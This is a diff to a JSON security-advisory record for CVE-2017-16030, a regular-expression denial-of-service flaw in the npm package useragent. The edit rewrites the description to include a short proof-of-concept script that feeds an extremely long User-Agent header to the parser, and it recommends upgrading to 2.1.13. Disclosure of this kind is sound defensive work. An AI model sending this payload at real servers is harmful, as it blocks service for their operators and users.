@@ -27,12 +27,12 @@
         "Value": "CVE-2017-16030"
       }
     ],
-    "Description": "Useragent is used to parse useragent headers. It uses several regular expressions to accomplish this. An attacker could edit their own headers, creating an arbitrarily long useragent string, causing the event loop and server to block. This affects Useragent 2.1.12 and earlier.",
+    "Description": "Affected versions of `useragent` are vulnerable to regular expression denial of service when an arbitrarily long `User-Agent` header is parsed.\n\n\n## Proof of Concept\n```\nvar useragent = require('useragent');\n\nvar badUserAgent = 'MSIE 0.0'+Array(900000).join('0')+'XBLWP';\nvar request = 'GET / HTTP/1.1\\r\\nUser-Agent: ' + badUserAgent + '\\r\\n\\r\\n';\nconsole.log(useragent.parse(request));\n```\n\n\n## Recommendation\n\nUpdate to version 2.1.13 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-07-24T19:59:13Z",
     "Severity": "HIGH",
-    "Summary": "High severity vulnerability that affects useragent",
-    "UpdatedAt": "2019-07-03T21:02:01Z",
+    "Summary": "ReDoS via long UserAgent header in useragent",
+    "UpdatedAt": "2020-08-31T22:18:27Z",
     "WithdrawnAt": ""
   },
   "Versions": [
